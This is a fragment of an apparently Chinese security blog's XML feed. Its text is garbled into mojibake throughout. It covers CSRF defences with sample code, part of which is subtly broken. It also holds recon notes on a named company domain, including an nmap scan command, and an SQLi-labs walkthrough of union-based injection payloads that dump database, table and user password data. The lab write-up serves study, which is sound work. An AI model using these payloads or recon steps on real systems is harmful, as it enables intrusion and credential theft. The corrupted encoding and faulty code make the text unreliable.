å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚<br> è¿™ç§æ–¹æ³•è¦æ¯”æ£€æŸ¥ Referer è¦å®‰å…¨ä¸€äº›ï¼Œtoken å¯ä»¥åœ¨ç”¨æˆ·ç™»é™†åäº§ç”Ÿå¹¶æ”¾äº session ä¹‹ä¸­ï¼Œç„¶ååœ¨æ¯æ¬¡è¯·æ±‚æ—¶æŠŠ token ä» session ä¸­æ‹¿å‡ºï¼Œä¸è¯·æ±‚ä¸­çš„ token è¿›è¡Œæ¯”å¯¹ï¼Œä½†è¿™ç§æ–¹æ³•çš„éš¾ç‚¹åœ¨äºå¦‚ä½•æŠŠ token ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚ã€‚å¯¹äº GET è¯·æ±‚ï¼Œtoken å°†é™„åœ¨è¯·æ±‚åœ°å€ä¹‹åï¼Œè¿™æ · URL å°±å˜æˆ <a href="https://link.jianshu.com/?t=http://url?csrftoken=tokenvalue">http://url?csrftoken=tokenvalue</a>ã€‚ è€Œå¯¹äº POST è¯·æ±‚æ¥è¯´ï¼Œè¦åœ¨ form çš„æœ€ååŠ ä¸Š <input type="â€hiddenâ€" name="â€csrftokenâ€" value="â€tokenvalueâ€/">ï¼Œè¿™æ ·å°±æŠŠ token ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥è¯·æ±‚äº†ã€‚ä½†æ˜¯ï¼Œåœ¨ä¸€ä¸ªç½‘ç«™ä¸­ï¼Œå¯ä»¥æ¥å—è¯·æ±‚çš„åœ°æ–¹éå¸¸å¤šï¼Œè¦å¯¹äºæ¯ä¸€ä¸ªè¯·æ±‚éƒ½åŠ ä¸Š token æ˜¯å¾ˆéº»çƒ¦çš„ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“æ¼æ‰ï¼Œé€šå¸¸ä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶ï¼Œä½¿ç”¨ javascript éå†æ•´ä¸ª dom æ ‘ï¼Œå¯¹äº dom ä¸­æ‰€æœ‰çš„ a å’Œ form æ ‡ç­¾ååŠ å…¥ tokenã€‚è¿™æ ·å¯ä»¥è§£å†³å¤§éƒ¨åˆ†çš„è¯·æ±‚ï¼Œä½†æ˜¯å¯¹äºåœ¨é¡µé¢åŠ è½½ä¹‹ååŠ¨æ€ç”Ÿæˆçš„ html ä»£ç ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡æœ‰ä½œç”¨ï¼Œè¿˜éœ€è¦ç¨‹åºå‘˜åœ¨ç¼–ç æ—¶æ‰‹åŠ¨æ·»åŠ  tokenã€‚<br> è¯¥æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªç¼ºç‚¹æ˜¯éš¾ä»¥ä¿è¯ token æœ¬èº«çš„å®‰å…¨ã€‚ç‰¹åˆ«æ˜¯åœ¨ä¸€äº›è®ºå›ä¹‹ç±»æ”¯æŒç”¨æˆ·è‡ªå·±å‘è¡¨å†…å®¹çš„ç½‘ç«™ï¼Œé»‘å®¢å¯ä»¥åœ¨ä¸Šé¢å‘å¸ƒè‡ªå·±ä¸ªäººç½‘ç«™çš„åœ°å€ã€‚ç”±äºç³»ç»Ÿä¹Ÿä¼šåœ¨è¿™ä¸ªåœ°å€åé¢åŠ ä¸Š tokenï¼Œé»‘å®¢å¯ä»¥åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šå¾—åˆ°è¿™ä¸ª tokenï¼Œå¹¶é©¬ä¸Šå°±å¯ä»¥å‘åŠ¨ CSRF æ”»å‡»ã€‚ä¸ºäº†é¿å…è¿™ä¸€ç‚¹ï¼Œç³»ç»Ÿå¯ä»¥åœ¨æ·»åŠ  token çš„æ—¶å€™å¢åŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè¿™ä¸ªé“¾æ¥æ˜¯é“¾åˆ°è‡ªå·±æœ¬ç«™çš„ï¼Œå°±åœ¨åé¢æ·»åŠ  tokenï¼Œå¦‚æœæ˜¯é€šå‘å¤–ç½‘åˆ™ä¸åŠ ã€‚ä¸è¿‡ï¼Œå³ä½¿è¿™ä¸ª csrftoken ä¸ä»¥å‚æ•°çš„å½¢å¼é™„åŠ åœ¨è¯·æ±‚ä¹‹ä¸­ï¼Œé»‘å®¢çš„ç½‘ç«™ä¹ŸåŒæ ·å¯ä»¥é€šè¿‡ Referer æ¥å¾—åˆ°è¿™ä¸ª token å€¼ä»¥å‘åŠ¨ CSRF æ”»å‡»ã€‚è¿™ä¹Ÿæ˜¯ä¸€äº›ç”¨æˆ·å–œæ¬¢æ‰‹åŠ¨å…³é—­æµè§ˆå™¨ Referer åŠŸèƒ½çš„åŸå› ã€‚</p><h6 id="åœ¨-HTTP-å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯"><a href="#åœ¨-HTTP-å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯" class="headerlink" title="åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯"></a>åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯</h6><p>è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯ä½¿ç”¨ token å¹¶è¿›è¡ŒéªŒè¯ï¼Œå’Œä¸Šä¸€ç§æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æŠŠ token ä»¥å‚æ•°çš„å½¢å¼ç½®äº HTTP è¯·æ±‚ä¹‹ä¸­ï¼Œè€Œæ˜¯æŠŠå®ƒæ”¾åˆ° HTTP å¤´ä¸­è‡ªå®šä¹‰çš„å±æ€§é‡Œã€‚é€šè¿‡ XMLHttpRequest è¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Š csrftoken è¿™ä¸ª HTTP å¤´å±æ€§ï¼Œå¹¶æŠŠ token å€¼æ”¾å…¥å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†ä¸Šç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥ token çš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡ XMLHttpRequest è¯·æ±‚çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒ token ä¼šé€è¿‡ Referer æ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ä¸­å»ã€‚<br> ç„¶è€Œè¿™ç§æ–¹æ³•çš„å±€é™æ€§éå¸¸å¤§ã€‚XMLHttpRequest è¯·æ±‚é€šå¸¸ç”¨äº Ajax æ–¹æ³•ä¸­å¯¹äºé¡µé¢å±€éƒ¨çš„å¼‚æ­¥åˆ·æ–°ï¼Œå¹¶éæ‰€æœ‰çš„è¯·æ±‚éƒ½é€‚åˆç”¨è¿™ä¸ªç±»æ¥å‘èµ·ï¼Œè€Œä¸”é€šè¿‡è¯¥ç±»è¯·æ±‚å¾—åˆ°çš„é¡µé¢ä¸èƒ½è¢«æµè§ˆå™¨æ‰€è®°å½•ä¸‹ï¼Œä»è€Œè¿›è¡Œå‰è¿›ï¼Œåé€€ï¼Œåˆ·æ–°ï¼Œæ”¶è—ç­‰æ“ä½œï¼Œç»™ç”¨æˆ·å¸¦æ¥ä¸ä¾¿ã€‚å¦å¤–ï¼Œå¯¹äºæ²¡æœ‰è¿›è¡Œ CSRF é˜²æŠ¤çš„é—ç•™ç³»ç»Ÿæ¥è¯´ï¼Œè¦é‡‡ç”¨è¿™ç§æ–¹æ³•æ¥è¿›è¡Œé˜²æŠ¤ï¼Œè¦æŠŠæ‰€æœ‰è¯·æ±‚éƒ½æ”¹ä¸º XMLHttpRequest è¯·æ±‚ï¼Œè¿™æ ·å‡ ä¹æ˜¯è¦é‡å†™æ•´ä¸ªç½‘ç«™ï¼Œè¿™ä»£ä»·æ— ç–‘æ˜¯ä¸èƒ½æ¥å—çš„ã€‚</p><h5 id="é˜²å¾¡å®ä¾‹"><a href="#é˜²å¾¡å®ä¾‹" class="headerlink" title="é˜²å¾¡å®ä¾‹"></a>é˜²å¾¡å®ä¾‹</h5><h6 id="Sailajsæ¡†æ¶ä¸­çš„JavaScript-ä»£ç ç¤ºä¾‹"><a href="#Sailajsæ¡†æ¶ä¸­çš„JavaScript-ä»£ç ç¤ºä¾‹" class="headerlink" title="Sailajsæ¡†æ¶ä¸­çš„JavaScript ä»£ç ç¤ºä¾‹"></a>Sailajsæ¡†æ¶ä¸­çš„JavaScript ä»£ç ç¤ºä¾‹</h6><p>ä¸‹é¢å°†ä»¥ JavaScript ä¸ºä¾‹ï¼Œå¯¹ä¸Šè¿°ä¸‰ç§æ–¹æ³•åˆ†åˆ«ç”¨ä»£ç è¿›è¡Œç¤ºä¾‹ã€‚</p><p>1.éªŒè¯ Referer</p></li></ul>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä» HTTP å¤´ä¸­å–å¾— Referer å€¼</span></span><br><span class="line"> <span class="keyword">var</span> referer=req.headers.Referer; </span><br><span class="line"> <span class="comment">// åˆ¤æ–­ Referer æ˜¯å¦ä»¥ test.example å¼€å¤´</span></span><br><span class="line"> <span class="keyword">if</span>((referer!=<span class="literal">null</span>) &amp;&amp; (_.startsWith(referer, â€œtest.example â€))&#123; </span><br><span class="line">    <span class="comment">// éªŒè¯é€šè¿‡</span></span><br><span class="line"> &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">// éªŒè¯å¤±è´¥ï¼Œè¿”å›é”™è¯¯</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>  2.éªŒè¯è¯·æ±‚ä¸­çš„ token</p>  <figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> session = req.session;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// ä» session ä¸­å¾—åˆ° csrftoken å±æ€§</span></span><br><span class="line"><span class="keyword">var</span>  token = session.csrftoken; </span><br><span class="line"><span class="keyword">if</span>(token == <span class="literal">null</span>)&#123; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// äº§ç”Ÿæ–°çš„ token æ”¾å…¥ session ä¸­</span></span><br><span class="line">   token = generateToken(); </span><br><span class="line">   token.csrftoken = token ; </span><br><span class="line">  <span class="keyword">return</span> ....</span><br><span class="line">&#125; <span class="keyword">else</span>&#123; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// ä» HTTP å¤´ä¸­å–å¾— csrftoken </span></span><br><span class="line">   <span class="keyword">var</span>  token = req.headers.csrftoken; </span><br><span class="line">  </span><br><span class="line">   <span class="comment">// ä»è¯·æ±‚å‚æ•°ä¸­å–å¾— csrftoken </span></span><br><span class="line">   <span class="keyword">var</span>  xhrToken = req.param(<span class="string">&#x27;csrftoken&#x27;</span>); </span><br><span class="line">   <span class="keyword">if</span>(token != <span class="literal">null</span> &amp;&amp; xhrToken != <span class="literal">null</span> &amp;&amp; token.equals(xhrToken))&#123; </span><br><span class="line">      <span class="keyword">return</span> ...</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">       <span class="keyword">return</span> ...  <span class="comment">// ERROR</span></span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§(ç½‘ä¸Šä¾‹å­)</li></ol>  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> plainXhr = dojo.xhr; </span><br><span class="line"></span><br><span class="line"> <span class="comment">// é‡å†™ dojo.xhr æ–¹æ³•</span></span><br><span class="line"> dojo.xhr = <span class="function"><span class="keyword">function</span>(<span class="params">method,args,hasBody</span>) </span>&#123; </span><br><span class="line">    <span class="comment">// ç¡®ä¿ header å¯¹è±¡å­˜åœ¨</span></span><br><span class="line">    args.headers = args.header || &#123;&#125;; </span><br><span class="line">        </span><br><span class="line">    tokenValue = <span class="string">&#x27;&lt;%=request.getSession(false).getAttribute(&quot;csrftoken&quot;)%&gt;&#x27;</span>; </span><br><span class="line">    <span class="keyword">var</span> token = dojo.getObject(<span class="string">&quot;tokenValue&quot;</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æŠŠ csrftoken å±æ€§æ”¾åˆ°å¤´ä¸­</span></span><br><span class="line">    args.headers[<span class="string">&quot;csrftoken&quot;</span>] = (token) ? token : <span class="string">&quot;  &quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> plainXhr(method,args,hasBody); </span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>  CSRF æ˜¯ä¸€ç§å±å®³éå¸¸å¤§çš„æ”»å‡»ï¼Œåˆå¾ˆéš¾ä»¥é˜²èŒƒã€‚ç›®å‰å‡ ç§é˜²å¾¡ç­–ç•¥è™½ç„¶å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸ŠæŠµå¾¡ CSRF çš„æ”»å‡»ï¼Œä½†å¹¶æ²¡æœ‰ä¸€ç§å®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚ä¸€äº›æ–°çš„æ–¹æ¡ˆæ­£åœ¨ç ”ç©¶ä¹‹ä¸­ï¼Œæ¯”å¦‚å¯¹äºæ¯æ¬¡è¯·æ±‚éƒ½ä½¿ç”¨ä¸åŒçš„åŠ¨æ€å£ä»¤ï¼ŒæŠŠ Referer å’Œ token æ–¹æ¡ˆç»“åˆèµ·æ¥ï¼Œç”šè‡³å°è¯•ä¿®æ”¹ HTTP è§„èŒƒï¼Œä½†æ˜¯è¿™äº›æ–°çš„æ–¹æ¡ˆå°šä¸æˆç†Ÿï¼Œè¦æ­£å¼æŠ•å…¥ä½¿ç”¨å¹¶è¢«ä¸šç•Œå¹¿ä¸ºæ¥å—è¿˜éœ€æ—¶æ—¥ã€‚åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬åªæœ‰å……åˆ†é‡è§† CSRFï¼Œæ ¹æ®ç³»ç»Ÿçš„å®é™…æƒ…å†µé€‰æ‹©æœ€åˆé€‚çš„ç­–ç•¥ï¼Œè¿™æ ·æ‰èƒ½æŠŠ CSRF çš„å±å®³é™åˆ°æœ€ä½.</p><h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>Tokençš„å®šä¹‰ï¼šTokenæ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä»¥ä½œå®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚çš„ä¸€ä¸ªä»¤ç‰Œï¼Œå½“ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªTokenä¾¿å°†æ­¤Tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä»¥åå®¢æˆ·ç«¯åªéœ€å¸¦ä¸Šè¿™ä¸ªTokenå‰æ¥è¯·æ±‚æ•°æ®å³å¯ï¼Œæ— éœ€å†æ¬¡å¸¦ä¸Šç”¨æˆ·åå’Œå¯†ç ã€‚</p></IMG></IMG></IMG>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goktech</title>
      <link href="/2021/01/31/x/goktech/"/>
      <url>/2021/01/31/x/goktech/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¸—é€æµ‹è¯•æ€è·¯"><a href="#æ¸—é€æµ‹è¯•æ€è·¯" class="headerlink" title="æ¸—é€æµ‹è¯•æ€è·¯"></a>æ¸—é€æµ‹è¯•æ€è·¯</h2><p>1ï¼ ä¿¡æ¯æ”¶é›†</p><p>2ï¼ æ¼æ´æŒ–æ˜</p><p>3ï¼ æ¼æ´åˆ©ç”¨</p><p>4ï¼ è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Š</p><p>ä¿¡æ¯æ”¶é›†ï¼š</p><p>1.</p><p>åŸºæœ¬ä¿¡æ¯ï¼š</p><p>åŸŸåä¿¡æ¯ : goktech.cn</p><p>å­åŸŸå: å­åŸŸåæŒ–æ˜æœº.exe  :bbs.goktech.cn   phpinfo,me</p><p>ipåœ°å€ï¼šç«™é•¿ä¹‹å®¶</p><p>åŒipåœ°å€çš„å…¶ä»–ç½‘ç«™ä¿¡æ¯</p><p>ç«¯å£ 80(httpï¼‰443(https)</p><p>æœåŠ¡ï¼ŒæœåŠ¡ç‰ˆæœ¬ï¼ˆwebæœåŠ¡ï¼‰ åŒç½‘æ®µçš„å…¶ä»–æœåŠ¡å™¨ä¿¡æ¯ï¼ˆcæ®µï¼‰</p><p>ä¿¡æ¯æ³„éœ²ï¼ŒGitHub.com å¦‚qq.com user pass</p><p>ç½‘ç«™ç›®å½•ï¼šå¾¡å‰‘</p><p>2.</p><p>Osæ“ä½œç³»ç»Ÿ</p><p>Linux windows macç­‰</p><p>3.</p><p>  Webä¸­é—´ä»¶ï¼ˆwebç¨‹åºï¼Œç”¨æ¥æä¾›ç½‘é¡µæœåŠ¡ï¼‰</p><p>ç±»å‹ã€ç‰ˆæœ¬ï¼šiisï¼Œapacheï¼Œnginxï¼Œweblogic</p><p>4.</p><p>  æ•°æ®åº“</p><p>ç±»å‹ã€ç‰ˆæœ¬ï¼šMySQLã€mssqlã€Oracleã€access</p><p>5.</p><p> åç¼–çš„è„šæœ¬ç±»å‹</p><h3 id="Linuxçš„æŒ‡ä»¤"><a href="#Linuxçš„æŒ‡ä»¤" class="headerlink" title="Linuxçš„æŒ‡ä»¤"></a>Linuxçš„æŒ‡ä»¤</h3><p>ifconfigâ€”æŸ¥çœ‹ipåœ°å€</p><p>dhclientâ€”é‡æ–°è·å–åœ°å€</p><h4 id="namp-è¯¸ç¥ä¹‹çœ¼"><a href="#namp-è¯¸ç¥ä¹‹çœ¼" class="headerlink" title="namp,è¯¸ç¥ä¹‹çœ¼"></a>namp,è¯¸ç¥ä¹‹çœ¼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p><p>-p è¿…é€Ÿæ‰«ææŒ‡å®šçš„ç«¯å£</p><p>-F  å¿«é€Ÿæ‰«æ100ä¸ªå¸¸ç”¨çš„ç«¯å£</p><p>-r  é¡ºåºæ‰«æï¼ŒæŒ‰ä»å°åˆ°å¤§çš„é¡ºåºè¿›è¡Œç«¯å£æ‰«æ</p><p>å…¶ä»–å¸¸ç”¨é€‰é¡¹</p><p>-sV æ£€æµ‹æœåŠ¡ç«¯è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯</p><p>-O  æ£€æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯</p><p>-Pn ç¦ç”¨nampçš„ä¸»æœºæ£€æµ‹åŠŸèƒ½</p><p>-A æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ã€å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œè¯†åˆ«ã€è¿›è¡Œè„šæœ¬æ‰«æã€è¿›è¡Œè·¯ç”±æ¢æµ‹</p><p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> åˆ†äº« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç«¯å£</title>
      <link href="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/"/>
      <url>/2021/01/24/web/%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>80ç«¯å£ï¼Œ443ç«¯å£</p><p>80ç«¯å£æ˜¯ä¸º<a href="https://baike.baidu.com/item/HTTP">HTTP</a>[è¶…æ–‡æœ¬ä¼ è¾“åè®®]å¼€æ”¾çš„ï¼Œæ­¤ä¸ºä¸Šç½‘å†²æµªä½¿ç”¨æ¬¡æ•°æœ€å¤šçš„åè®®ï¼Œä¸»è¦ç”¨äºWWWï¼ˆWorld Wide Webï¼‰å³ä¸‡ç»´ç½‘ä¼ è¾“ä¿¡æ¯çš„åè®®ã€‚ï¼ˆæ¥è‡ªç™¾åº¦ï¼‰</p><p>å¯ä»¥é€šè¿‡HTTPåœ°å€ï¼ˆå³å¸¸è¯´çš„â€œç½‘å€â€ï¼‰åŠ â€œ: 80â€æ¥è®¿é—®ç½‘ç«™ï¼Œå› ä¸ºæµè§ˆç½‘é¡µæœåŠ¡é»˜è®¤çš„<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7/10883658">ç«¯å£å·</a>éƒ½æ˜¯80ï¼Œå› æ­¤åªéœ€è¾“å…¥ç½‘å€å³å¯ï¼Œä¸ç”¨è¾“å…¥â€œ: 80â€äº†ã€‚(æ¥è‡ªç™¾åº¦)</p><p>443ç«¯å£ï¼šhttpsé»˜è®¤è°ƒç”¨443ç«¯å£ï¼Œå‘443å‘è¯·æ±‚ï¼Œ80ç«¯å£æ‹¿æ•°æ®ï¼›ä¼ è¾“æ—¶æ³¨æ„åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†ç®—æ³•éœ€è¦åˆ†äº«ï¼Œ</p><p>1.æµè§ˆå™¨æäº¤æ”¯æŒçš„åŠ å¯†ç®—æ³•åˆ—è¡¨</p><p>2.æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œä¸‹å‘ä¸€ä¸ªåŠ å¯†ç®—æ³•</p><p>3.æ‘˜è¦ç®—æ³•ï¼Œå°†ä¸€æ®µæ•°æ®åŠ å¯†å¾—åˆ°å¯†æ–‡ï¼ˆæ‘˜è¦ï¼‰</p><p>ç­¾åï¼šå¯¹äºä¸€ä¸ªå†…å®¹ï¼Œè®¤å¯æ•°æ®ï¼Œè®¤è¯æœºåˆ¶ï¼Œè®¤å¯æ‘˜è¦ï¼ˆé˜²ç¯¡æ”¹ï¼‰</p><p>åŸæœ¬çš„æ•°æ®+æ‘˜è¦+ç®—æ³•â€”â€”&gt;æ•°æ®é˜²ç¯¡æ”¹â€”â€”&gt;çœŸæ­£åŒ…å«äº†ç­¾åçš„</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL labs1-10</title>
      <link href="/2020/12/09/sql/1-10/"/>
      <url>/2020/12/09/sql/1-10/</url>
      
        <content type="html"><![CDATA[<h4 id="Less1ï¼šï¼ˆåŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less1ï¼šï¼ˆåŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less1ï¼šï¼ˆåŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less1ï¼šï¼ˆåŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h4><p>è§£é¢˜æ€è·¯ï¼š</p><p><strong>æ–¹æ³•ä¸€ï¼Œunion è”åˆæŸ¥è¯¢æ³¨å…¥</strong></p><p>1ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ / ï¼Ÿid=1â€™   å›æ˜¾é”™è¯¯ï¼Œå»æ‰ â€˜ å‘ç°å›æ˜¾æ­£å¸¸ï¼Œå‘ç°æ˜¯<strong>å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</strong></p><p><strong>æ³¨æ„æ­¤æ—¶å› ä¸ºå‰é¢æŠ¥é”™å¯ä»¥çœ‹åˆ°æœ‰limit 0,1æˆ‘ä»¬å¯ä»¥çŸ¥é“æ­¤å¤„å¦‚æœéœ€è¦è¾“å‡ºæˆ‘ä»¬unionæŸ¥è¯¢å‡ºçš„ä¿¡æ¯è¦å°†å‰é¢çš„ä½å äº†ï¼Œå³ä½¿å‰é¢çš„è¾“å‡ºä¸ºä¸å­˜åœ¨ã€‚å¯ä»¥çœ‹åˆ°æˆ‘æ˜¯å°†idçš„å€¼å†™ä¸ºè´Ÿå€¼ï¼Œç„¶åå°†è¾“å‡ºçš„ä½ç½®å°±è®©ç»™äº†åé¢æˆ‘ä»¬éœ€è¦è¾“å‡ºçš„ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ€å·§åœ¨æœ‰è¾“å‡ºé™åˆ¶çš„æ—¶å€™ååˆ†é‡è¦ã€‚</strong></p><p>2ï¼Œç„¶åç”¨ order by åˆ¤æ–­æœ‰å‡ åˆ—æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; ?id &#x3D; 1&#39; order by 3 %23  </span><br></pre></td></tr></table></figure><p>å›æ˜¾æ­£å¸¸ï¼Œorder by 4 çš„æ—¶å€™å‘ç°å›æ˜¾é”™è¯¯ï¼Œè¯´æ˜æœ‰3 åˆ—</p><p><strong>æˆ‘ä»¬ä¸Šé¢çŒœæµ‹å‡ºäº†å­—æ®µæ•°ä¸º3ï¼Œä½†è¿™é‡Œè¾“å‡ºçš„åªæœ‰2ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬unionæŸ¥è¯¢è¦ä¿è¯å­—æ®µæ•°ä¸€æ ·ï¼Œä¸è¶³çš„è¡¥æ•°å­—ï¼ˆåªæœ‰mysqlå¯ä»¥ï¼‰ï¼Œæˆ–è€…nullã€‚ç„¶åç¬¬ä¸€ä¸ªæ˜¯æ²¡æœ‰è¾“å‡ºçš„ï¼Œæ‰€ä»¥æˆ‘å°†éœ€è¦è¾“å‡ºçš„å†™åœ¨äº†åé¢ä¸¤ä¸ªã€‚</strong></p><p>3ï¼Œå°†id=1æ”¹ä¸ºä¸€ä¸ªæ•°æ®åº“ä¸å­˜åœ¨çš„idå€¼ï¼Œå¦‚-1ï¼Œä½¿ç”¨union select 1,2,3è”åˆæŸ¥è¯¢è¯­å¥æŸ¥çœ‹é¡µé¢æ˜¯å¦æœ‰æ˜¾ç¤ºä½ã€‚</p><p>å‘ç°é¡µé¢å…ˆè¾“å‡ºäº†2å’Œ3ï¼Œè¯´æ˜é¡µé¢æœ‰2ä¸ªæ˜¾ç¤ºä½</p><p>4ï¼Œç„¶ååˆ©ç”¨sqlæŸ¥è¯¢è¯­å¥ä¾æ¬¡çˆ†ç ´å‡ºæ•°æ®åº“å†…çš„æ•°æ®åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œå­—æ®µä¿¡æ¯</p><p>ï¼ˆ1ï¼‰ çˆ†æ•°æ®åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata %23</span><br></pre></td></tr></table></figure><p><strong>ä¸Šé¢çš„çˆ†å‡ºå…¨éƒ¨çš„æ•°æ®åº“åï¼Œ\</strong>ä¸‹é¢çš„çˆ†å½“å‰çš„æ•°æ®åº“åï¼š****</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() %23</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ çˆ†è¡¨åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰çˆ†å­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰çˆ†å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p>0x3a ä»£è¡¨åå…­è¿›åˆ¶çš„ â€˜ ï¼š 